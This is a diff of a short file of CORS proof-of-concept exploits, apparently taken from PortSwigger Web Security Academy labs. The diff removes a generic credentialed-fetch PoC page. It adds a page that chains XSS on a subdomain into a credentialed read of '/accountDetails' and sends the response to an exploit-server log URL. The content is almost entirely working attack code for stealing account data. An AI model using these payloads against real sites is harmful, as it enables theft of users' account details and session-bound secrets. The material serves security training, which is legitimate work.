@@ -1,25 +1,13 @@
-<!DOCTYPE html>
+Below are some of the PoC for CORS extracted from Portswigger.
+
+Case 1: CORS through Sub-domain (Needed to have XSS in one of the subdomains)
+
 <html>
-<head>
-<script>
-function cors() {
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-if (this.readyState == 4 && this.status == 200) {
-document.getElementById(“demo”).innerHTML = alert(this.responseText);
-}
-};
-xhttp.open(“GET”, “https://vulnerable_website/vulnerable_endpoint”, true);
-xhttp.withCredentials = true;
-xhttp.send();
-}
-</script>
-</head>
-<body>
-<center>
-<h2>CORS PoC Exploit </h2>
-<div id=”demo”>
-<button type=”button” onclick=”cors()”>Exploit</button>
-</div>
-</body>
+    <body>
+        <h1>PoC for CORS Through Sub-domain</h1>
+        <script>
+            document.location="http://stock.0a69006d04edea9b807badaa00050063.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a69006d04edea9b807badaa00050063.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6a000a04a5ea0f8042ac6101fe0029.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+        </script>
+    </body>
 </html>
+
